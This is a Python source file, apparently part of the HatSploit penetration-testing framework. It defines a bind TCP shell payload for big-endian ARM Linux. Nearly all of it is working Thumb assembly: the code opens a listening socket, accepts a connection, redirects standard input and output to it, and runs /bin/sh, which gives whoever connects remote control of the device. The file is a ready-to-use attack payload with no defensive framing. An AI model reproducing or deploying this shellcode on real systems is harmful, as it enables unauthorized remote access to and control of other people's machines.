"""
This payload requires HatSploit: https://hatsploit.com
Current source: https://github.com/EntySec/HatSploit
"""

from hatsploit.lib.core.payload.basic import *
from hatsploit.lib.core.payload.linux import Linux


class HatSploitPayload(Payload, BindTCPHandler, Linux):
    def __init__(self):
        super().__init__({
            'Name': "Linux armbe Shell Bind TCP",
            'Payload': "linux/armbe/shell_bind_tcp",
            'Authors': [
                "Ivan Nikolskiy (enty8080) - payload developer",
            ],
            'Description': """
                This payload creates an interactive bind TCP shell for Linux
                with ARM big-endian architecture.
            """,
            'Arch': ARCH_ARMBE,
            'Platform': OS_LINUX,
        })

        self.shell = Option('SHELL', '/bin/sh', "Executable path.", True,
                            advanced=True)

    def implant(self):
        return self.__asm__(
            """
            start:
                add r1, pc, 1
                bx r1
            """
        ) + self.__asm__(
            f"""
            start:
                movs r7, 0x3f
                movs r1, 2

            dup:
                mov r0, ip
                svc 1

                subs r1, 1
                bpl dup

                adr	r0, shell
                subs r2, r2, r2
                push {{r0, r2}}
                mov r1, sp
                movs r7, 0xb
                svc 1

                mov r8, r8

            shell:
                .asciz "{self.shell.value}"
            """,
            mode='thumb'
        )

    def run(self):
        return self.__asm__(
            """
            start:
                add r1, pc, 1
                bx r1
            """
        ) + self.__asm__(
            f"""
            start:
                movs r0, 2
                movs r1, 1
                subs r2, r2, r2
                lsls r7, r1, 8
                adds r7, 0x19
                svc 1

                mov ip, r0
                adr r1, addr
                movs r2, 0x10
                adds r7, 1
                svc 1

                mov r0, ip
                movs r1, 2
                adds r7, 2
                svc 1

                mov r0, ip
                eors r1, r1
                eors r2, r2
                adds r7, 1
                svc 1

                mov ip, r0
                movs r7, 0x3f
                movs r1, 2

            dup:
                mov r0, ip
                svc 1

                subs r1, 1
                bpl dup

                adr	r0, shell
                subs r2, r2, r2
                push {{r0, r2}}
                mov r1, sp
                movs r7, 0xb
                svc 1

                mov r8, r8

            addr:
                .short 0x2
                .short 0x{self.rport.big.hex()}
                .word 0x0

            shell:
                .asciz "/bin/sh"
            """,
            mode='thumb'
        )
